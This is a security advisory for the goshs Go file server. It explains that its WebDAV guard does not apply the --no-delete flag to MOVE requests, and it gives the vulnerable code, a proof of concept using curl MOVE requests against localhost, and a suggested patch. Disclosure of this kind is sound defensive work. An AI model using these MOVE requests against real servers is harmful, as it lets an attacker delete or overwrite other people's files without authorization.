# [C] goshs --no-delete WebDAV MOVE bypass allows file deletion/overwrite

## Summary
Severity: Critical
Advisory: GHSA-hq33-8jgp-8qq3
CVE: CVE-2026-64863
CWE: CWE-284
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-07-28
Source: https://github.com/advisories/GHSA-hq33-8jgp-8qq3
Type: github-advisory

## Affected
- Go: `goshs.de/goshs/v2` — affected >=0 <2.1.4
- Go: `github.com/patrickhener/goshs/v2` — affected >=0 <2.1.4
- Go: `goshs.de/goshs` — affected >=0
- Go: `github.com/patrickhener/goshs` — affected >=0

## Details
## Summary

The WebDAV mode-flag guard added to fix GHSA-3whc-qvhv-xqjp still does not enforce `--no-delete` on the WebDAV `MOVE` verb. `MOVE` deletes the source file (rename removes it from its original path), and with `Overwrite: T` it additionally performs an explicit `RemoveAll` on the destination. Under `-w --no-delete`, `DELETE` is correctly blocked (403) but `MOVE` still destroys existing files, defeating the documented "Disable the delete option" boundary.

This is a residual of the parent fix: the guard classifies `MOVE`/`COPY` as write-only verbs (blocked only under `--read-only`) and never treats `MOVE` as a delete, so the `--no-delete` branch never covers it.

## Affected

goshs v2.1.3 (current release, commit `ba00ce3`). The guard was introduced when GHSA-3whc-qvhv-xqjp was fixed and carries the gap forward.

## Details

`httpserver/server.go`, `wdGuard` (lines 237-254):

```go
wdGuard := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
    switch r.Method {
    case http.MethodPut, "MKCOL", "MOVE", "COPY":
        if fs.ReadOnly {
            http.Error(w, "read-only", http.StatusForbidden)
            return
        }
    case http.MethodDelete:
        if fs.ReadOnly || fs.UploadOnly || fs.NoDelete {
            http.Error(w, "delete disabled", http.StatusForbidden)
            return
        }
    case http.MethodGet, http.MethodHead:
        if fs.UploadOnly {
            http.Error(w, "upload-only", http.StatusForbidden)
            return
        }
    }
    ...
```

`MOVE` lives in the first case and is gated only by `fs.ReadOnly`. It is never checked against `fs.NoDelete`. But `MOVE` in `golang.org/x/net/webdav` (`file.go`, `moveFiles`) calls `fs.Rename(ctx, src, dst)`, which removes the source from its original location, and when the `Overwrite: T` header is present it first calls `fs.RemoveAll(ctx, dst)` on an existing destination. Both are deletions. So `--no-delete`, whose help text reads "Disable the delete option", does not disable deletion via `MOVE`.

The `.goshs` ACL layer (`webdav_acl.go`) checks auth and block-lists only; it does not enforce the mode flags, so it does not close this gap.

## Proof of concept

Reproduced live against goshs v2.1.3 on 2026-07-02. Server started with `--no-delete` and WebDAV enabled:

```
$ printf 'TOP-SECRET-CONTENTS\n' > webroot/secret.txt
$ printf 'VICTIM-EXISTING-FILE\n'  > webroot/victim.txt
$ goshs -d webroot -i 127.0.0.1 -p 18080 --webdav --webdav-port 18081 --no-delete
INFO  Serving WEBDAV on 127.0.0.1:18081 from webroot
```

Control - DELETE is correctly blocked:

```
$ curl -s -i -X DELETE http://127.0.0.1:18081/secret.txt
HTTP/1.1 403 Forbidden
Content-Type: text/plain; charset=utf-8
Server: goshs/v2.1.3 (darwin; go1.26.1)
```

secret.txt still exists on disk.

Bypass 1 - MOVE removes the source file despite --no-delete:

```
$ curl -s -i -X MOVE -H 'Destination: http://127.0.0.1:18081/gone.txt' http://127.0.0.1:18081/secret.txt
HTTP/1.1 201 Created
Server: goshs/v2.1.3 (darwin; go1.26.1)
```

secret.txt is now deleted from disk (its content is at gone.txt).

Bypass 2 - MOVE with Overwrite:T destroys an existing victim file:

```
# before: victim.txt = VICTIM-EXISTING-FILE
$ curl -s -i -X MOVE -H 'Destination: http://127.0.0.1:18081/victim.txt' -H 'Overwrite: T' http://127.0.0.1:18081/gone.txt
HTTP/1.1 204 No Content
Server: goshs/v2.1.3 (darwin; go1.26.1)
# after:  victim.txt = TOP-SECRET-CONTENTS   (original VICTIM-EXISTING-FILE destroyed via RemoveAll)
```

## Impact

An operator running `goshs -w --no-delete -d /srv/artifacts` to deliver files that must not be removed still allows any WebDAV client to delete or clobber existing files via `MOVE`. Confidential existing files can be renamed away or overwritten. The `--no-delete` control is silently ineffective on the WebDAV port for the `MOVE` verb.

## Suggested fix

Move `MOVE` (and `COPY` on collision-with-overwrite, which also deletes) into the delete-gated branch, or add `fs.NoDelete` to the write-verb branch for `MOVE`:

```go
case http.MethodPut, "MKCOL", "COPY":
    if fs.ReadOnly {
        http.Error(w, "read-only", http.StatusForbidden)
        return
    }
case "MOVE":
    // MOVE renames (deletes source) and, with Overwrite:T, RemoveAll(dst).
    if fs.ReadOnly || fs.UploadOnly || fs.NoDelete {
        http.Error(w, "move disabled", http.StatusForbidden)
        return
    }
case http.MethodDelete:
    if fs.ReadOnly || fs.UploadOnly || fs.NoDelete {
        http.Error(w, "delete disabled", http.StatusForbidden)
        return
    }
```

Add an integration test covering `MOVE` under `--no-delete` (the current `testWebdavMoveCopy` only exercises MOVE/COPY in unrestricted mode).

## References
- https://github.com/goshs-labs/goshs/security/advisories/GHSA-hq33-8jgp-8qq3
- https://github.com/goshs-labs/goshs/commit/0444ac6b1a8176ddae70d940adf7a26b2e5a6c29
- https://github.com/goshs-labs/goshs
- https://github.com/goshs-labs/goshs/releases/tag/v2.1.4
